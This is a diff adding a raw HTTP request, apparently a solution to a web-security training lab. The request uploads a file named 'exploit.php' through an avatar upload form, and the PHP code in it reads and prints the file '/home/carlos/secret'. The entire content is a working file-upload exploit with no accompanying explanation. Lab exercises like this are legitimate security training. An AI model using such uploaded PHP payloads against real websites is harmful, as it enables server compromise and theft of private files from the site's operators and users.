@@ -1,0 +1,22 @@
+POST /my-account/avatar HTTP/2
+Host: <LAB-ID>.web-security-academy.net
+Cookie: session=<REDACTED>
+Content-Type: multipart/form-data; boundary=----geckoformboundary
+
+------geckoformboundary
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: application/x-php
+
+<?php
+echo file_get_contents('/home/carlos/secret');
+?>
+
+------geckoformboundary
+Content-Disposition: form-data; name="user"
+
+wiener
+------geckoformboundary
+Content-Disposition: form-data; name="csrf"
+
+<REDACTED>
+------geckoformboundary--
